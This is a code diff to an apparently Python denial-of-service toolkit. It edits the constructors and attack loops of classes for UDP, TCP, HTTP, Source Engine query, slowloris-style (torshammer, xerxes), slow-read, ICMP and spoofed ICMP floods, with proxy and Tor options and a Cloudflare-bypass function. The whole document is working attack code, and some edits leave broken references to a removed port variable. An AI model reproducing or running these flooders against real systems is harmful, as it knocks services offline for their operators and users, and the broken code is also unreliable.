@@ -64,10 +64,9 @@ def reset():#reset all values
 '''
 
 class udp_flood:
- def __init__(self,u,port=80,ports=None,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
+ def __init__(self,u,p=80,threads_daemon=False,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
   self.target=u
-  self.port=port
-  self.ports=ports
+  self.port=p
   self.interval=interval
   self.min_size=min_size
   self.max_size=max_size
@@ -80,7 +79,7 @@ class udp_flood:
   self.start=time.time()
   for x in range(threads):
    t=threading.Thread(target=self.attack)
-   t.daemon=True
+   t.daemon=threads_daemon
    t.start()
  def attack(self):
   time.sleep(1)
@@ -93,10 +92,6 @@ class udp_flood:
     if self.stop==True:
      break
     try:
-     if self.ports:
-      p=random.choice(self.ports)
-     else:
-      p=self.port
      s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
      if self.connection==True:
       s.connect((self.target,p))
@@ -105,7 +100,7 @@ class udp_flood:
       msg+=random.choice(lis)
      if len(msg)>1400:
        msg=msg[0:1400]#make sure all payloads' sizes are on the right range
-     s.sendto((msg.encode('utf-8')),(self.target,p))
+     s.sendto((msg.encode('utf-8')),(self.target,self.port))
      size+=len(msg)
      self.counter+=1
      if((self.logs==True) and (int(time.time()-tm)==1)):
@@ -136,13 +131,10 @@ class udp_flood:
   self.reset()#this will kill any running threads instantly by setting all the attacking information to "None" and cause error which is handled with the "try...except..." around the main while loop
   return a
   
-
-
 class vse_flood:
- def __init__(self,u,port=80,ports=None,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
+ def __init__(self,u,p=80,threads_daemon=False,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
   self.target=u
-  self.port=port
-  self.ports=ports
+  self.port=p
   self.payload=b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
   self.interval=interval
   self.connection=connection
@@ -154,7 +146,7 @@ class vse_flood:
   self.start=time.time()
   for x in range(threads):
    t=threading.Thread(target=self.attack)
-   t.daemon=True
+   t.daemon=threads_daemon
    t.start()
  def attack(self):
   time.sleep(1)
@@ -166,13 +158,9 @@ class vse_flood:
     if self.stop==True:
      break
     try:
-     if self.ports:
-      p=random.choice(self.ports)
-     else:
-      p=self.port
      s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
      if self.connection==True:
-      s.connect((self.target,p))
+      s.connect((self.target,self.port))
      s.sendto(self.payload,(self.target,p))
      self.counter+=1
      if((self.logs==True) and (int(time.time()-tm)==1)):
@@ -204,7 +192,7 @@ class vse_flood:
 
 
 class tcp_flood:
- def __init__(self,u,p=80,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,threads_daemon=False,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
   self.stop=False
   self.counter=0
@@ -221,7 +209,7 @@ class tcp_flood:
   self.round_max=round_max
   for x in range(threads):
    t=threading.Thread(target=self.attack)
-   t.daemon=True
+   t.daemon=threads_daemon
    t.start()
  def attack(self):
   time.sleep(1)#give time for all threads to be created
@@ -290,7 +278,7 @@ class tcp_flood:
 
 
 class http_spam:
- def __init__(self,u,p=80,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,threads_daemon=False,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
   self.stop=False
   self.counter=0
@@ -310,7 +298,7 @@ class http_spam:
   self.post_field_min=post_field_min
   for x in range(threads):
    t=threading.Thread(target=self.attack)
-   t.daemon=True
+   t.daemon=threads_daemon
    t.start()
  def attack(self):
   try:
@@ -406,7 +394,7 @@ class http_spam:
 
 
 class prox_http_spam(threading.Thread):
- def __init__(self,u,p=80,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,threads_daemon=False,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
   self.logs=logs
   self.stop=False
   self.counter=0
@@ -435,7 +423,7 @@ class prox_http_spam(threading.Thread):
   self.post_field_min=post_field_min
   for x in range(threads):
    t=threading.Thread(target=self.attack)
-   t.daemon=True
+   t.daemon=threads_daemon
    t.start()
  def attack(self):
   time.sleep(1)
@@ -548,7 +536,7 @@ class prox_http_spam(threading.Thread):
 
 
 class torshammer:
- def __init__(self,u,p=80,threads=500,timeout=5,tor=False,duration=60,logs=False,max_content=15000,min_content=10000):
+ def __init__(self,u,p=80,threads_daemon=False,threads=500,timeout=5,tor=False,duration=60,logs=False,max_content=15000,min_content=10000):
   self.counter=0
   self.max_content=max_content
   self.min_content=min_content
@@ -562,7 +550,7 @@ class torshammer:
   self.logs=logs
   for x in range(threads):
    t=threading.Thread(target=self.attack)
-   t.daemon=True
+   t.daemon=threads_daemon
    t.start()
  def attack(self):
   time.sleep(1)
@@ -624,7 +612,7 @@ class torshammer:
 
 
 class prox_hammer:
- def __init__(self,u,p=80,scraping_timeout=15,max_content=15000,min_content=10000,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True):
+ def __init__(self,u,p=80,threads_daemon=False,scraping_timeout=15,max_content=15000,min_content=10000,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True):
   self.httplist=http_list
   if not self.httplist and self.httplist!=[]:
    self.httplist=masshttp(timeout=scraping_timeout)
@@ -646,7 +634,7 @@ class prox_hammer:
   self.counter=0
   for x in range(threads):
    t=threading.Thread(target=self.attack)
-   t.daemon=True
+   t.daemon=threads_daemon
    t.start()
  def attack(self):
   time.sleep(1)
@@ -721,7 +709,7 @@ class prox_hammer:
 
 
 class xerxes:
- def __init__(self,u,p=80,threads=500,timeout=5,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,threads_daemon=False,threads=500,timeout=5,duration=60,logs=False,tor=False):
   self.counter=0
   self.target=u
   self.port=p
@@ -734,7 +722,7 @@ class xerxes:
   self.id_key=0
   for x in range(threads):
    t=threading.Thread(target=self.attack)
-   t.daemon=True
+   t.daemon=threads_daemon
    t.start()
    self.id_key+=1
  def attack(self):
@@ -788,7 +776,7 @@ class xerxes:
 
 
 class prox_xerxes:
- def __init__(self,u,scraping_timeout=15,p=80,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=False):
+ def __init__(self,u,scraping_timeout=15,p=80,threads_daemon=False,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=False):
   self.httplist=http_list
   if not self.httplist and self.httplist!=[]:
    self.httplist=masshttp(timeout=scraping_timeout)
@@ -809,7 +797,7 @@ class prox_xerxes:
   self.id_key=0
   for x in range(threads):
    t=threading.Thread(target=self.attack)
-   t.daemon=True
+   t.daemon=threads_daemon
    t.start()
    self.id_key+=1
  def attack(self):
@@ -895,7 +883,7 @@ class prox_xerxes:
 '''
 
 class slow_read:
- def __init__(self,u,p=80,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=False,tor=False,duration=60):
+ def __init__(self,u,p=80,threads_daemon=False,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=False,tor=False,duration=60):
   self.counter=0
   self.stop=False
   self.target=u
@@ -911,7 +899,7 @@ class slow_read:
   self.start=time.time()
   for x in range(threads):
    t=threading.Thread(target=self.attack)
-   t.daemon=True
+   t.daemon=threads_daemon
    t.start()
  def attack(self):
   time.sleep(1)
@@ -980,7 +968,8 @@ class slow_read:
   self.reset()
   return a
    
-
+#This is a on process work for next versions
+"""
 
 class apa(threading.Thread):
  def run(self):
@@ -1125,10 +1114,10 @@ def prox_slow(u,p=80,scraping_timeout=15,threads=500,timeout=5,min_speed=3,max_s
  sre1=min_speed
  global sre2
  sre2=max_speed
- """global rre1
+ '''global rre1
  rre1=read1
  global rre2
- rre2=read2"""
+ rre2=read2'''
  for x in range(threads):
   try:
    t=ptc()
@@ -3011,6 +3000,7 @@ class icmpcl(threading.Thread):
   self.port=port
   self.minttl=minttl
   self.maxttl=maxttl
+  self.logs=True
   time.sleep(2)
   while (stop!=True):
    data=''
@@ -3057,7 +3047,7 @@ def icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,min_ttl
  global stop
  stop=False
  
- self.logs=logs
+ logs=logs
  global target
  target=u
  global port
@@ -3067,11 +3057,11 @@ def icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1,min_ttl
  global minttl
  minttl=min_ttl
  wh=1
- """try:
+ '''try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
   wh+=1
  except socket.error as msg:
-  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")"""
+  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")'''
  if wh>0:  
   for x in range(threads):
    try:
@@ -3113,6 +3103,7 @@ class icmpst(threading.Thread):
   self.minsize=minsize
   self.maxsize=maxsize
   self.ip_seg=ip_seg
+  self.logs=True
   time.sleep(2)
   while (stop!=True):
    data=''
@@ -3136,7 +3127,7 @@ class icmpst(threading.Thread):
         sys.stdout.flush()
         #print("Packets sent: {} | IP: {} | Bytes: {}".format(icmpstorm_counter,sip,len(data)))
    except Exception as e:
-    pass
+    print(e)
    time.sleep(self.interval)
   self.interval=None
   self.target=None
@@ -3166,7 +3157,7 @@ def spoofed_icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1
  global ip_seg
  ip_seg=ip_range
  
- self.logs=logs
+ logs=logs
  global target
  target=u
  global port
@@ -3176,11 +3167,11 @@ def spoofed_icmp_flood(u,p=80,min_size=10,max_size=50,limiting=True,interval=0.1
  global minttl
  minttl=min_ttl
  wh=1
- """try:
+ '''try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
   wh+=1
  except socket.error as msg:
-  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")"""
+  print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")'''
  if wh>0:  
   for x in range(threads):
    try:
@@ -3992,3 +3983,4 @@ def cf_kill_ua_rate_limiting(u,threads=500,timeout=5,duration=60,logs=True,retur
     break
  if returning==True:
     return cf_doser_counter
+"""
